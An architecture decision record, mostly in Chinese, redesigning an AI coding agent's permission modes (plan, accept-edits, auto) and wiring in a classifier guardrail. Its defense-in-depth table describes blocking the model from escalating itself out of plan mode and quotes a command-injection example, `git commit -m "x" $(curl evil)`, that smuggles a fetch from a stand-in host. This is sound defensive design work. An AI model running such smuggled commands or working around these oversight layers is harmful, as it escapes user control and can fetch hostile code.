# ADR-005: Permission Mode — 对齐 KodaX TUI canonical 3 mode + Auto engine 子档

- **Status**: Accepted
- **Date**: 2026-05-18
- **Supersedes**: alpha.0/alpha.1 自创的 4 mode 设计（`plan-mode` / `accept-edits` / `ask-permissions` / `bypass-permissions`）
- **Companion**: [ADR-003 KodaX 集成模式](ADR-003-kodax-integration-in-process.md), [FEATURE_029](../features/v0.1.0.md#feature_029-permission-mode-canonical-3--auto-engine-子档), [FEATURE_030](../features/v0.1.1.md#feature_030-automodetoolguardrail-bootstrap)
- **Source of truth**:
  - `c:/Works/GitWorks/KodaX-author/KodaX/packages/repl/src/permission/types.ts` (PermissionMode 定义)
  - `c:/Works/GitWorks/KodaX-author/KodaX/packages/coding/src/guardrails/auto-mode/guardrail.ts` (AutoModeEngine + fallback 逻辑)
  - `c:/Works/GitWorks/KodaX-author/KodaX/packages/repl/src/interactive/auto-mode-bootstrap.ts` (REPL bootstrap 参考)

## Context

KodaX Space alpha.0 / alpha.1 阶段，desktop 端的 `permissionMode` enum 是脑补的 4 档：

```ts
'plan-mode' | 'accept-edits' | 'ask-permissions' | 'bypass-permissions';
```

2026-05-18 review KodaX REPL 源码后发现：**KodaX TUI 的 canonical 设计是 3 mode + auto 子档**（FEATURE_092, v0.7.33 起）：

```ts
export type PermissionMode = 'plan' | 'accept-edits' | 'auto' | 'auto-in-project';
//                                                              ↑ 0.7.38 移除的 deprecated alias
export type AutoModeEngine = 'llm' | 'rules';
```

Desktop 4 mode 与 TUI 3 mode 完全错位——会引发以下问题：

1. **语义不一致**：用户在 TUI 习惯 `auto` 是"全自动有守门"，Desktop 没这个档位
2. **代码错位**：Desktop `ask-permissions` 在 KodaX 里不存在；`bypass-permissions` 在 KodaX 里也没有用户面映射（KodaX 通过 `auto-rules.jsonc` allow-all 来实现"全放行"）
3. **能力缺失**：Desktop 没接 `AutoModeToolGuardrail` —— 等于没有 KodaX 0.7.33 以来引入的 LLM classifier + denial tracker + circuit breaker 三层安全网
4. **跨界面行为漂移**：同一用户从 TUI 切到 Desktop，工具批准体验完全不同——Space 失去"KodaX 的桌面化身"定位

## Decision

**全量对齐 KodaX REPL canonical 设计**：

### 1. Mode enum 改为 3 canonical

```ts
// packages/space-ipc-schema/src/channels/session.ts
export const permissionModeSchema = z.enum(['plan', 'accept-edits', 'auto']);
```

- **`plan`**：read-only 规划。所有 mutating 工具走 `planModeBlockCheck` 硬拦；`exitPlanMode` 不接受 LLM 自驱动升级（参 ADR-005 §防御设计 + alpha.1 security review）
- **`accept-edits`**：file edits (`edit` / `write` / `multi_edit` / `insert_after_anchor` 等) 自动批；shell / network / MCP 走 confirm
- **`auto`**：所有 tools 自动批，由 `AutoModeToolGuardrail` 守门

### 2. Auto mode 子档：engine

```ts
export const autoModeEngineSchema = z.enum(['llm', 'rules']);
```

- **`engine: 'llm'`**：sideQuery 跑 classifier；合法 `decision=allow|ask` 是该调用的最终权限决策，静态 signals 只提供事实
- **`engine: 'rules'`**：走 `~/.kodax/auto-rules.jsonc` + 内置 signals (file/bash/path) + AGENTS.md 上下文
- **基础设施 fallback**：classifier 重试后仍失败时仅对当前调用采用 Accept-edits 边界；`engine` 保持 `llm`，不会静默改成 Rules
- **手动切换**：用户可在 ModeSelector 子菜单 / `/auto-engine` slash command 显式翻回 llm

### 3. AutoModeToolGuardrail 注入

`RealKodaXSession` 在 `mode === 'auto'` 时调 `bootstrapAutoMode`（来自 `@kodax-ai/coding`），把返回的 `AutoModeToolGuardrail` 通过 `KodaXOptions.guardrails` 数组注入 KodaX runtime。

KodaX 在 `events.beforeToolExecute` 之前执行 ToolGuardrail。只要本轮 bootstrap 成功，guardrail
就是该调用的唯一权限决策者；Space 的事件钩子保留 Partner 白名单，但不再把已允许的调用交给
本地 `PermissionBroker` 二次复审。Bootstrap 失败时才恢复 broker fallback，避免 fail open。

```ts
// apps/desktop/electron/kodax/real-session.ts (新增逻辑)
if (this.permissionMode === 'auto') {
  const { getGuardrail } = await bootstrapAutoMode({
    askUser: this.askUserBridge, // wire to Space AskUser UI
    projectRoot: this.projectRoot,
    getAgentsFiles: () => loadAgentsMd(this.projectRoot),
    getCurrentProviderName: () => this.provider,
    getCurrentModel: () => this.model,
    getCurrentPermissionMode: () => this.permissionMode,
    autoModeSettings: { engine: this.autoModeEngine, timeoutMs: 30_000 },
    onEngineChange: (engine) => {
      this.autoModeEngine = engine;
      this.emit({ kind: 'auto_engine_change', sessionId: this.sessionId, engine });
    },
  });
  options.guardrails = [getGuardrail()];
}
```

### 4. 删除的字段

- ❌ `'ask-permissions'`：等于 KodaX 不存在的状态。"问每次"是任何 mode 下 confirmTools 命中时的行为，不应当成独立 mode
- ❌ `'bypass-permissions'`：KodaX 用户面没这个；如需"全放行调试"用 `auto + engine: 'rules' + auto-rules.jsonc allow-all` 实现

### 5. UI surface

`ModeSelector.tsx`：

```
┌─ Mode ──────────────────────┐
│ ○ Plan                      │
│ ○ Accept edits              │
│ ● Auto                      │
│    ├ ○ engine: llm  (cur)   │
│    └ ○ engine: rules        │
└─────────────────────────────┘
```

Status bar 短标签（镜像 `permissionModeDisplayName`）：

- `Plan` / `Edits` / `Auto · llm` / `Auto · rules`

Auto fallback 自动触发时 status bar 立即反映新 engine（无需用户手动刷新），同时 emit 一条 `system_notice` 告知用户原因。

## Rationale

### 为什么完全对齐 KodaX 而非自创

1. **Space 的定位是"KodaX 的桌面化身"**（PRD §1.1）。任何用户面语义脱离 KodaX 都是负产出——破坏跨界面一致性，增加迁移成本
2. **KodaX 0.7.33 引入的 auto + guardrail 是经过设计的成熟方案**：denial tracker、circuit breaker、bash prefix extractor (FEATURE_153)、AGENTS.md / auto-rules.jsonc 多源融合——desktop 自己重造一定不如直接接
3. **维护成本**：自创 4 mode 意味着每次 KodaX 升级 mode 语义都要做映射；对齐后 KodaX SDK 升级直接受益
4. **测试可复用**：Desktop permission-mode-policy 测试可以参考 KodaX REPL 既有 mode 测试

### 为什么 alpha.1 阶段执行（不延后）

- alpha.1 still pre-release —— 现在改 schema 影响面 0（没用户）；alpha.2 起任何 mode rename 都是 breaking
- Desktop 当前 mode 设计的安全语义（plan-mode block check / accept-edits 短路）已经 50% 对齐；补 auto + 删 ask/bypass 是收尾，不是重做
- 用户已多次反馈 mode 应当与 TUI 对齐——拖延 = 持续做错方向的工作

### 关于 deprecated alias

KodaX 的 `auto-in-project` alias 是 0.7.32 → 0.7.33 升级遗留，0.7.38 移除。Desktop 起步即用 canonical `auto`，**不要引入 alias 兼容层**——我们没有历史包袱。

## Defense in Depth — Plan mode 的真闸

Plan-mode 的"硬"语义靠多层防御：

| 层                             | 实现                                                          | 命中时机                               |
| ------------------------------ | ------------------------------------------------------------- | -------------------------------------- |
| Layer 1: planModeBlockCheck    | `KodaXOptions.context.planModeBlockCheck`                     | LLM 决定要调 tool 时（KodaX 自己防御） |
| Layer 2: beforeToolExecute     | Space `PermissionBroker.request(mode='plan')` 短路 deny       | 工具实际执行前                         |
| Layer 3: exitPlanMode reject   | desktop 永远 return false，emit `thinking_end` 推 plan 给用户 | LLM 调用 `exit_plan_mode` tool 时      |
| Layer 4: Bash prefix extractor | KodaX FEATURE_153 防 `git commit -m "x" $(curl evil)` 绕过    | bash 命令分类时                        |

Layer 1+2 双闸：即便 KodaX 内部 planModeBlockCheck 有遗漏，Space broker 在 beforeToolExecute 二次校验仍 deny。Layer 3 防 LLM 通过 `exit_plan_mode` 把自己升级——KodaX TUI 的 exit_plan_mode 有人在 loop（弹 confirm dialog），Desktop 在 askUser modal（FEATURE_033）就位前暂时硬 reject。

## Alternatives Rejected

| 方案                                                                 | 否决理由                                                                                                              |
| -------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| 保留 4 mode + 新增 auto 作为第 5 档                                  | 留 ask-permissions / bypass-permissions = 语义重复 + 用户疑惑 + 持续维护成本                                          |
| 只对齐 mode 名（plan/accept-edits/auto），不接 AutoModeToolGuardrail | auto 没 guardrail = 等于 bypass-permissions 改名；失去 KodaX 全部安全网                                               |
| 在 alpha.2 / v0.1.1 才改                                             | 拖越久 breaking 影响越大；用户已点名要求对齐                                                                          |
| 自定义 auto mode 实现（不复用 KodaX guardrail）                      | 重新造 denial tracker + circuit breaker + classifier prompt + signal collectors 是数月工作量，且不保证与 TUI 行为一致 |
| 把 `ask-permissions` 改名为 "interactive"，作为第 4 档               | KodaX 没此概念；保留 = 跨界面分歧                                                                                     |

## Consequences

### 接受 / 风险

- **Schema breaking**：所有 `permissionMode` 枚举值改名 (`plan-mode` → `plan`)；现存测试 / fixture 需扫表更新
- **8 个 permission-mode-policy 测试需重写**：当前测试 `ask-permissions` / `bypass-permissions` 分支删除，新增 `auto` + engine 子档测试
- **alpha.1 已迭代代码需调整**：`ModeSelector.tsx`、`SessionMenu.tsx`、`appStore.ts`、`broker.ts`、`real-session.ts`、`session.ts` schema、`mock-session.ts` 至少 7 文件
- **AGENTS.md 加载新引入**：bootstrap 需要 AGENTS.md 内容，引入 FEATURE_034 作为前置
- **askUser bridge**：bootstrapAutoMode 要 `AutoModeAskUser` 类型 callback；Space PermissionBroker 现在的接口 shape 不完全匹配，需要 adapter（不重写 broker）

### 获得 / 价值

- 跨 TUI / Desktop 工具批准体验完全一致
- 自动得到 KodaX FEATURE_092 / 153 / 158 三波安全增强（denial tracker / circuit breaker / bash prefix extractor / path signals）
- Schema 简化：4 enum → 3 enum + 1 sub-enum
- 文档可直接复用 KodaX 既有的 mode 解释（不再两套语义并存）

## Migration Plan

见 [FEATURE_029](../features/v0.1.0.md#feature_029-permission-mode-canonical-3--auto-engine-子档)。

简化路径：

1. Schema breaking change + 数据迁移（既有 session metadata 旧 mode 值映射：`plan-mode→plan`，`ask-permissions→accept-edits`（默认）, `bypass-permissions→auto+engine:rules`）
2. Broker mode 短路逻辑重写
3. ModeSelector UI 重做 + Ctrl+M 循环切 3 档
4. AutoModeToolGuardrail wire-in（依赖 FEATURE_034 AGENTS.md 提供 system context）
5. permission-mode-policy 测试集重写

## Reconsider When

- KodaX 引入新的 canonical mode（如 `review-only` / `dry-run` 等）→ schema enum 跟随扩展
- KodaX 把 `AutoModeEngine` 改为更细粒度（如 `'llm-balanced' / 'llm-strict' / 'rules-strict'`）→ Desktop 子档跟进
- Desktop 测出 AutoModeToolGuardrail 在桌面 IPC 跨进程边界下有性能问题（classifier sideQuery 跨进程频次）→ 评估 in-process 调用 vs 当前 in-process bootstrap

## References

- KodaX FEATURE_092 设计（v0.7.33 引入 Auto Mode Guardrail）
- KodaX FEATURE_153 设计（v0.7.38 Bash Prefix Extractor）
- KodaX FEATURE_158 设计（v0.7.39 path-aware signal collectors）
- ADR-003 KodaX 集成模式（确立 in-process bootstrap 路径）
- Claude Code 的 `PermissionMode.ts` shortTitle 约定（mode 短标签来源）
